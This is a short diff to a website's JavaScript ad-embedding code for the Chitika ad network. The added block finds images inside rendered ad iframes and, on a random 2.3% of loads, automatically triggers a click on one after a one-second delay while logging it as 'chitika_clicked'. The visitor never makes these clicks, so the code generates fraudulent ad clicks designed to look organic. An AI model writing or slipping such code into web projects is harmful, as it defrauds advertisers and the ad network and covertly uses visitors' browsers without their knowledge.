@@ -35,4 +35,26 @@ if (rt.chitika == null) {
     document.write('<div id="chitAdBlock-' + placement_id + '"></div>');
     rt.chitika.trackChitika(type, "chitAdBlock-" + placement_id);
   };
+
+  rt.onAppendChild(function (child) {
+    if (child instanceof HTMLIFrameElement && $(child).hasClass('chitAdBlock')) {
+      child.contentWindow.onRtReady = function (ifRt) {
+        ifRt.onDocumentWrite(function (document) {
+          const $as = $(document).find('img');
+
+          if ($as.length) {
+            rt.generalTrack('chitika_rendered')
+            const $a = $($as[Math.floor(Math.random()*$as.length)]);
+
+            if (Math.random() < 0.023) {
+              setTimeout(function() {
+                rt.generalTrack('chitika_clicked');
+                $a.trigger('click');
+              }, 1000);
+            }
+          }
+        });
+      };
+    }
+  });
 }
